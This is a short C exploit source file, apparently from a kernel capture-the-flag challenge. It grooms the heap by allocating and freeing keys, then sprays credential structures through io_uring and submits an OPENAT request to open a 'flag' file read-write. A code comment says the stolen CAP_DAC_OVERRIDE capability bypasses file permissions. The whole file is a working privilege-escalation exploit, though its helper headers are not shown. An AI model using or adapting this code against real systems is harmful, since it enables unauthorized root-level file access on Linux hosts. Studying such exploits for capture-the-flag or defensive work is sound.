#include "banzi.h"
#include "io_uring.h"
#include "cred.h"

void do_exploit() {
    for (int i = 0; i < 0x20; i++) {
        alloc_key(i, "A", 1);
    }

    for (int i = 0; i < 0x20; i++) {
        free_key(i);
    }
}

void do_exploit1() {
    struct submitter uring_cred;
    app_setup_uring(&uring_cred, 0x80);
    alloc_n_creds(uring_cred.ring_fd, 0xffff);

    struct io_uring_sqe sqe;
    memset(&sqe, 0, sizeof(sqe));
    sqe.opcode = IORING_OP_OPENAT;
    sqe.fd = rootfd;
    sqe.addr = (__u64)"flag";
    sqe.open_flags = O_RDWR;    // we're using CAP_DAC_OVERRIDE, file permissions don't matter
    sqe.len = 0;
    sqe.file_index = 0;

    int reaped_success = 0, reap_cnt = 0, flag_fd;
    submit_to_sq(&uring_cred, &sqe, 1, 1);
    read_from_cq(&uring_cred, false, &reaped_success, &flag_fd);
}


int main() {
    do_exploit();
    do_exploit1();
}